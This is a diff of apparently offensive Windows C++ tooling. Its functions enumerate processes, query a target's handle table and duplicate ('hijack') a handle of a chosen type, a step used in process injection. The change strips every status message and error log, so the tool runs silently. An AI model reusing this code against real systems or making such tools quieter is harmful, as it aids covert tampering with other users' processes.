@@ -1,4 +1,4 @@
-#include "Utils.h"
+#include "include/Utils.h"
 
 
 
@@ -33,11 +33,8 @@ HANDLE hijackProcessHandle(_In_ HANDLE targetProcess, _In_ const wchar_t* handle
 
 
 
-	std::wcout << L"{+} Attempting to hijack handle of type: " << handleTypeName << std::endl;
-
 	if (!GetProcessHandleCount(targetProcess, (PDWORD)&totalHandles)) { //Total number of handles we need to account for
 
-		WIN32_ERR(GetProcessHandleCount);
 		duplicatedHandle = INVALID_HANDLE_VALUE;
 		goto FUNC_END;
 	}
@@ -49,7 +46,6 @@ HANDLE hijackProcessHandle(_In_ HANDLE targetProcess, _In_ const wchar_t* handle
 	pProcessSnapshotInfo = static_cast<PPROCESS_HANDLE_SNAPSHOT_INFORMATION>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleInfoSize));
 	if (pProcessSnapshotInfo == nullptr) {
 
-		WIN32_ERR(Process Snapshot Info Heap Alloc);
 		duplicatedHandle = INVALID_HANDLE_VALUE;
 		goto FUNC_END;
 	}
@@ -64,7 +60,6 @@ HANDLE hijackProcessHandle(_In_ HANDLE targetProcess, _In_ const wchar_t* handle
 
 	if (status != ERROR_SUCCESS) {
 
-		NTAPI_ERR(NtQueryInformationProcess, status);
 		duplicatedHandle = INVALID_HANDLE_VALUE;
 		goto FUNC_END;
 	}
@@ -103,14 +98,12 @@ HANDLE hijackProcessHandle(_In_ HANDLE targetProcess, _In_ const wchar_t* handle
 			NULL);
 
 		if (status != ERROR_SUCCESS) {
-			NTAPI_ERR(NtQueryObject, status);
 			break;
 		}
 
 
 		if (wcsncmp(handleTypeName, objectInfo->TypeName.Buffer, wcslen(handleTypeName)) == 0) {
 
-			std::wcout << L"{!} found \"" << objectInfo->TypeName.Buffer << L"\" handle! Hijacking successful." << std::endl;
 			handleFound = true;
 			break;
 		}
@@ -155,7 +148,6 @@ HANDLE enumerateProcess(_In_ wchar_t* processName, _Outptr_opt_ uint32_t* pPid) 
 
 
 	if (!K32EnumProcesses((PDWORD)PidArray, sizeof(PidArray), (LPDWORD)&bytesReturned)) {
-		WIN32_ERR(K32EnumProcesses);
 		return INVALID_HANDLE_VALUE;
 	}
 
@@ -180,7 +172,6 @@ HANDLE enumerateProcess(_In_ wchar_t* processName, _Outptr_opt_ uint32_t* pPid) 
 
 		if (wcscmp(moduleBaseName, processName) == 0) {
 
-			std::wcout << L"{+} Got a handle to process: " << processName << L" with PID: " << PidArray[i] << std::endl;
 			foundProcess = true;
 			break;
 		}
